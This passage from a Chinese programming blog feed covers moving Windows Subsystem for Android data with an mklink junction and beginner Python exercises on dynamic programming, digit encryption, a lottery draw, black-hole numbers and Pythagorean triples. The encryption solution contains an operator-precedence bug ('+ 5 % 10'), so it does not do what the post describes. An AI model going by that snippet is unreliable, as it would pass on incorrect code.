        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>WSA确实是个很好用的东西，毕竟能够直接跑上安卓系统，不用忍受模拟器那种广告，很方便</p><p>但是同样也带来了一些问题就是：你的C盘会爆满</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Move-your-wsa-data/explorer-20220830-181707.png"></p><p>这主要是因为WSA的数据盘都放在了<code>C:\Users\%username%\AppData\Local\Packages\MicrosoftCorporationII.WindowsSubsystemForAndroid_8wekyb3d8bbwe\LocalCache\</code>这个目录下，我的数据盘经过我的半年使用已经到了<code>34.3GB</code>了，然后就导致了我的C盘像上面那张图那样要炸了</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Move-your-wsa-data/explorer-20221124-131312.png"></p><p>我记得Linux里面有<code>ln</code>命令可以创建文件链接，然后Windows有个叫做<code>mklink</code>的（仅cmd可用，powershell没有，我踩了这个坑），之前为了让Epic和Steam的GTA5都可用还用过来着，这不用这个方法把数据移到其他硬盘里</p><p>我把文件放在了<code>D:\WSA-data</code>这个文件夹里，连着<code>C:\Users\%username%\AppData\Local\Packages\MicrosoftCorporationII.WindowsSubsystemForAndroid_8wekyb3d8bbwe\LocalCache\</code>的<code>LocalCache</code>文件夹整个放进去</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Move-your-wsa-data/explorer-20221124-131546.png"></p><p>然后按<kbd>Windows</kbd> + <kbd>X</kbd>，选择<code>Windows 终端（管理员）</code>（选择<code>powershell</code>或者<code>cmd</code>都行，但是一定要有管理员权限</p><p>然后打入下面这行命令（记得把后面的那个路径改成你自己的）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /J <span class="string">&quot;C:\Users\GamerNoTitle\AppData\Local\Packages\MicrosoftCorporationII.WindowsSubsystemForAndroid_8wekyb3d8bbwe\LocalCache&quot;</span> <span class="string">&quot;D:\WSA-data\LocalCache&quot;</span></span><br></pre></td></tr></table></figure><p>然后我们的文件链接就创建成功了，打开WSA，一切正常！</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.9：动态规划</title>
      <link href="/posts/Go-for-Python-Ch9/"/>
      <url>/posts/Go-for-Python-Ch9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="例题：跳台阶"><a href="#例题：跳台阶" class="headerlink" title="例题：跳台阶"></a>例题：跳台阶</h2><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。</p><p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p><ul><li>示例 1</li></ul><p>输入：n &#x3D; 2 输出：2 </p><p>解释：有两种方法可以爬到楼顶。 </p><ol><li><p>1 阶 + 1 阶 </p></li><li><p>2 阶</p></li></ol><ul><li>示例 2：</li></ul><p>输入：n &#x3D; 3 输出：3 </p><p>解释：有三种方法可以爬到楼顶。 </p><ol><li><p>1 阶 + 1 阶 + 1 阶 </p></li><li><p>1 阶 + 2 阶 </p></li><li><p>2 阶 + 1 阶</p></li></ol><p>1 &lt;&#x3D; n &lt;&#x3D; 45</p><h3 id="题解（递归法）"><a href="#题解（递归法）" class="headerlink" title="题解（递归法）"></a>题解（递归法）</h3><p>解释：一个<code>steps</code>为<code>n</code>的问题可以看做是<code>steps</code>为<code>n-1</code>和<code>steps</code>为<code>n-2</code>的步骤和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steps = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Steps: &#x27;</span>))   <span class="comment"># 台阶数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">degrade</span>(<span class="params">steps</span>):</span><br><span class="line">    <span class="keyword">if</span> steps == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> steps == <span class="number">2</span>: <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> degrade(steps - <span class="number">1</span>) + degrade(steps - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(degrade(steps))</span><br></pre></td></tr></table></figure><p>这个方法可以发现，当输入<code>steps</code>为<code>10</code>时，<code>degrade(9)</code>计算了<code>1</code>次，<code>degrade(8)</code>计算了<code>2</code>次（<code>degrade(9)</code>里面一次，自身一次），再往下发现越往下计算的次数越多，如果计算式子很复杂会消耗更多的时间</p><p>所以有一个优化的方式，就是把已经算过的值丢到一个新的变量里面存起来，如果计算过就不用计算了（缓存优化）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steps = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Steps: &#x27;</span>))   <span class="comment"># 台阶数</span></span><br><span class="line">memory = [-<span class="number">1</span>] * <span class="number">10000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">degrade</span>(<span class="params">steps</span>):</span><br><span class="line">    <span class="keyword">if</span> steps == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> steps == <span class="number">2</span>: <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> memory[steps] &gt;= <span class="number">0</span>: <span class="keyword">return</span> memory[steps]</span><br><span class="line">    memory[steps] = degrade(steps - <span class="number">1</span>) + degrade(steps - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> memory[steps]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(degrade(steps))</span><br></pre></td></tr></table></figure><p>或者使用字典来存储</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steps = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Steps: &#x27;</span>))   <span class="comment"># 台阶数</span></span><br><span class="line">memory = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">degrade</span>(<span class="params">steps</span>):</span><br><span class="line">    <span class="keyword">if</span> steps == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> steps == <span class="number">2</span>: <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> steps <span class="keyword">in</span> memory: <span class="keyword">return</span> memory[steps]</span><br><span class="line">    memory[steps] = degrade(steps - <span class="number">1</span>) + degrade(steps - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> memory[steps]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(degrade(steps))</span><br></pre></td></tr></table></figure><h2 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h2><p>步骤只有两步：</p><ul><li>分解（分解为规模较小的相似问题）</li><li>原子问题（可以由问题分解推出，这里就是<code>i=1</code>和<code>i=2</code>的情况）</li></ul><p>很多DP算法都能够用递归解决，因为这个比DP简单，所以先在这里列出来。</p><p><strong>递归会占用系统资源，而且递归一定会比循环更慢一些（尽管你用了缓存优化）</strong>，当递归数过高时会超过Python的最大深度，引起<code>RecursionError</code>然后就……像下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Steps: 10000</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\_pydevd_bundle\pydevd_trace_dispatch_regular.py&quot;, line 359, in __call__</span><br><span class="line">    is_stepping = pydev_step_cmd != -1</span><br><span class="line">RecursionError: maximum recursion depth exceeded in comparison</span><br><span class="line"></span><br><span class="line">During handling of the above exception, another exception occurred:</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;C:\Users\GamerNoTitle\AppData\Local\Programs\Python\Python310\lib\runpy.py&quot;, line 196, in _run_module_as_main</span><br><span class="line">    return _run_code(code, main_globals, None,</span><br><span class="line">  File &quot;C:\Users\GamerNoTitle\AppData\Local\Programs\Python\Python310\lib\runpy.py&quot;, line 86, in _run_code</span><br><span class="line">    exec(code, run_globals)</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy\__main__.py&quot;, line 39, in &lt;module&gt;</span><br><span class="line">    cli.main()</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy/..\debugpy\server\cli.py&quot;, line 430, in main</span><br><span class="line">    run()</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy/..\debugpy\server\cli.py&quot;, line 284, in run_file</span><br><span class="line">    runpy.run_path(target, run_name=&quot;__main__&quot;)</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\_pydevd_bundle\pydevd_runpy.py&quot;, line 321, in run_path</span><br><span class="line">    return _run_module_code(code, init_globals, run_name,</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\_pydevd_bundle\pydevd_runpy.py&quot;, line 135, in _run_module_code</span><br><span class="line">    _run_code(code, mod_globals, init_globals,</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\_pydevd_bundle\pydevd_runpy.py&quot;, line 124, in _run_code</span><br><span class="line">    exec(code, run_globals)</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\Desktop\Untitled.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    print(degrade(steps))</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\Desktop\Untitled.py&quot;, line 8, in degrade</span><br><span class="line">    memory[steps] = degrade(steps - 1) + degrade(steps - 2)</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\Desktop\Untitled.py&quot;, line 8, in degrade</span><br><span class="line">    memory[steps] = degrade(steps - 1) + degrade(steps - 2)</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\Desktop\Untitled.py&quot;, line 8, in degrade</span><br><span class="line">    memory[steps] = degrade(steps - 1) + degrade(steps - 2)</span><br><span class="line">  [Previous line repeated 983 more times]</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\Desktop\Untitled.py&quot;, line 4, in degrade</span><br><span class="line">    def degrade(steps):</span><br><span class="line">  File &quot;c:\Users\GamerNoTitle\.vscode\extensions\ms-python.python-2022.18.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\_pydevd_bundle\pydevd_trace_dispatch_regular.py&quot;, line 469, in __call__</span><br><span class="line">    return None if event == &#x27;call&#x27; else NO_FTRACE</span><br><span class="line">RecursionError: maximum recursion depth exceeded in comparison</span><br></pre></td></tr></table></figure><h2 id="DP算法"><a href="#DP算法" class="headerlink" title="DP算法"></a>DP算法</h2><h3 id="核心问题"><a href="#核心问题" class="headerlink" title="核心问题"></a>核心问题</h3><ul><li>合成问题</li><li>初始状态（就是<code>i=1</code>和<code>i=2</code>的状态）</li><li>计算后续状态</li></ul><h2 id="DP算法求解"><a href="#DP算法求解" class="headerlink" title="DP算法求解"></a>DP算法求解</h2><p>还是上面那个跳台阶问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steps = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Steps: &#x27;</span>))   <span class="comment"># 台阶数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">degrade</span>(<span class="params">steps</span>):</span><br><span class="line">    result = [<span class="number">0</span>] * (steps + <span class="number">1</span>)</span><br><span class="line">    result[<span class="number">1</span>], result[<span class="number">2</span>] = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, steps+<span class="number">1</span>):</span><br><span class="line">        result[i] = result[i-<span class="number">1</span>] + result[i-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> result[steps]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(degrade(steps))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Steps: 10000</span><br><span class="line">54438373113565281338734260993750380135389184554695967026247715841208582865622349017083051547938960541173822675978026317384359584751116241439174702642959169925586334117906063048089793531476108466259072759367899150677960088306597966641965824937721800381441158841042480997984696487375337180028163763317781927941101369262750979509800713596718023814710669912644214775254478587674568963808002962265133111359929762726679441400101575800043510777465935805362502461707918059226414679005690752321895868142367849593880756423483754386342639635970733756260098962462668746112041739819404875062443709868654315626847186195620146126642232711815040367018825205314845875817193533529827837800351902529239517836689467661917953884712441028463935449484614450778762529520961887597272889220768537396475869543159172434537193611263743926337313005896167248051737986306368115003088396749587102619524631352447499505204198305187168321623283859794627245919771454628218399695789223798912199431775469705216131081096559950638297261253848242007897109054754028438149611930465061866170122983288964352733750792786069444761853525144421077928045979904561298129423809156055033032338919609162236698759922782923191896688017718575555520994653320128446502371153715141749290913104897203455577507196645425232862022019506091483585223882711016708433051169942115775151255510251655931888164048344129557038825477521111577395780115868397072602565614824956460538700280331311861485399805397031555727529693399586079850381581446276433858828529535803424850845426446471681531001533180479567436396815653326152509571127480411928196022148849148284389124178520174507305538928717857923509417743383331506898239354421988805429332440371194867215543576548565499134519271098919802665184564927827827212957649240235507595558205647569365394873317659000206373126570643509709482649710038733517477713403319028105575667931789470024118803094604034362953471997461392274791549730356412633074230824051999996101549784667340458326852960388301120765629245998136251652347093963049734046445106365304163630823669242257761468288461791843224793434406079917883360676846711185597501</span><br></pre></td></tr></table></figure><h2 id="DP与递归的区别"><a href="#DP与递归的区别" class="headerlink" title="DP与递归的区别"></a>DP与递归的区别</h2><p>DP是正着算，递归是反着算，仅此而已，思考问题的思路不同。</p><h2 id="例题：网络路径数"><a href="#例题：网络路径数" class="headerlink" title="例题：网络路径数"></a>例题：网络路径数</h2><p>一个机器人位于一个 m x n 网格的左上角 。</p><p>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角。</p><p>问总共有多少条不同的路径？</p><ul><li>示例 1</li></ul><p>输入：m &#x3D; 3, n &#x3D; 7 输出：28</p><ul><li>示例 2</li></ul><p>输入：m &#x3D;3, n &#x3D; 2 输出：3 解释：从左上角开始，总共有 3 条路径可以到达右下角。 </p><ol><li><p>向右 -&gt; 向下 -&gt; 向下 </p></li><li><p>向下 -&gt; 向下 -&gt; 向右 </p></li><li><p>向下 -&gt; 向右 -&gt; 向下</p></li></ol><ul><li>示例 3</li></ul><p>输入：m &#x3D;7, n &#x3D; 3 </p><p>输出：28 </p><ul><li>示例 4</li></ul><p>输入：m &#x3D; 3, n &#x3D; 3 </p><p>输出：6</p><h3 id="题解（递归法）-1"><a href="#题解（递归法）-1" class="headerlink" title="题解（递归法）"></a>题解（递归法）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pathcount</span>(<span class="params">m, n</span>):</span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> pathcount(m-<span class="number">1</span>, n) + pathcount(m, n-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="题解（DP法）"><a href="#题解（DP法）" class="headerlink" title="题解（DP法）"></a>题解（DP法）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pathcount</span>(<span class="params">m, n</span>):</span><br><span class="line">    ls = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>)] <span class="keyword">for</span> __ <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>)]</span><br><span class="line">    ls[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(ls[<span class="number">1</span>])):<span class="comment"># 初始化状态初值</span></span><br><span class="line">        ls[<span class="number">1</span>][i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(ls)):</span><br><span class="line">        ls[i][<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    ls[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">    ls[<span class="number">2</span>][<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, m+<span class="number">1</span>): <span class="comment"># b是行</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n+<span class="number">1</span>): <span class="comment"># a是列</span></span><br><span class="line">            ls[b][a] = ls[b-<span class="number">1</span>][a] + ls[b][a-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(ls)</span><br><span class="line">    <span class="keyword">return</span> ls[m][n]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.8：综合题目</title>
      <link href="/posts/Go-for-Python-Ch8/"/>
      <url>/posts/Go-for-Python-Ch8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h2><p>一个公司对于一个四位数的整型数字的加密方式为：每位数位上的数字+5后除以十得到余数，将各数位上的余数按照第一位与第四位、第二位与第三位的顺序进行交换，得到最终结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;num: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = [message[<span class="number">0</span>], message[<span class="number">1</span>], message[<span class="number">2</span>], message[<span class="number">3</span>]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message)):</span><br><span class="line">    message[i] = <span class="built_in">int</span>(message[i]) + <span class="number">5</span> % <span class="number">10</span></span><br><span class="line">message[<span class="number">0</span>], message[<span class="number">1</span>], message[<span class="number">2</span>], message[<span class="number">3</span>] = message[<span class="number">3</span>], message[<span class="number">2</span>], message[<span class="number">1</span>], message[<span class="number">0</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">    result += <span class="built_in">str</span>(i)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="双色球"><a href="#双色球" class="headerlink" title="双色球"></a>双色球</h2><p>用程序模拟双色球开奖过程，红色球范围为1<del>33，蓝色球范围为1</del>16，红色球有6个且数字不能重复，蓝色球只有1个。</p><p>输出格式为：红色球：x x x x x x 蓝色球：x</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">reds = <span class="built_in">set</span>()</span><br><span class="line">blue = -<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(reds) &lt; <span class="number">6</span>:</span><br><span class="line">    reds.add(random.randint(<span class="number">1</span>,<span class="number">33</span>))</span><br><span class="line"></span><br><span class="line">blue = random.randint(<span class="number">1</span>,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;红色球：&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reds:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;蓝色球：<span class="subst">&#123;blue&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.7：整数练习</title>
      <link href="/posts/Go-for-Python-Ch7/"/>
      <url>/posts/Go-for-Python-Ch7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="黑洞数"><a href="#黑洞数" class="headerlink" title="黑洞数"></a>黑洞数</h2><ul><li>黑洞数又称陷阱数，是类具有奇特转换特性的整数。任何一个数字不全相同整数，经有限“重排求差”操作，总会得某一个或一些数，这些数即为黑洞数。“重排求差”操作即把组成该数的数字重排后得到的最大数减去重排后得到的最小数。或者是冰雹原理中的“1”黑洞数</li><li>求出三位数以内的黑洞数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">blackhole_num = <span class="built_in">set</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">num</span>):</span><br><span class="line">    num_ascend_ls = <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">str</span>(num)))</span><br><span class="line">    num_ascend = <span class="built_in">int</span>(num_ascend_ls[<span class="number">0</span>]+num_ascend_ls[<span class="number">1</span>]+num_ascend_ls[<span class="number">2</span>])</span><br><span class="line">    num_decend_ls = <span class="built_in">list</span>(<span class="built_in">reversed</span>(<span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">str</span>(num)))))</span><br><span class="line">    num_decend = <span class="built_in">int</span>(num_decend_ls[<span class="number">0</span>]+num_decend_ls[<span class="number">1</span>]+num_decend_ls[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> num_ascend, num_decend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">    num = i</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        num_ascend, num_decend = sort(num)</span><br><span class="line">        tmp = num_decend - num_ascend</span><br><span class="line">        <span class="keyword">if</span> tmp == num:</span><br><span class="line">            blackhole_num.add(tmp)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> tmp &lt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = tmp</span><br><span class="line"><span class="built_in">print</span>(blackhole_num)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;495&#125;</span><br></pre></td></tr></table></figure><p>我还去<a href="https://baike.baidu.com/item/%E9%BB%91%E6%B4%9E%E6%95%B0/761618">百度了一下</a>，三位数的黑洞数确实只有495……</p><h2 id="勾股数"><a href="#勾股数" class="headerlink" title="勾股数"></a>勾股数</h2><ul><li>这个应该不用多介绍了吧……输出100以内的所有勾股数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 暴力做法</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line">nums = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, a+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(sqrt(a ** <span class="number">2</span> + b ** <span class="number">2</span>)).endswith(<span class="string">&#x27;.0&#x27;</span>) <span class="keyword">and</span> sqrt(a ** <span class="number">2</span> + b ** <span class="number">2</span>) &lt;= <span class="number">100</span>:</span><br><span class="line">            nums.append((b, a, <span class="built_in">int</span>(sqrt(a**<span class="number">2</span>+b**<span class="number">2</span>))))</span><br><span class="line">nums.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(nums)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出（共52个）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(3, 4, 5), (5, 12, 13), (6, 8, 10), (7, 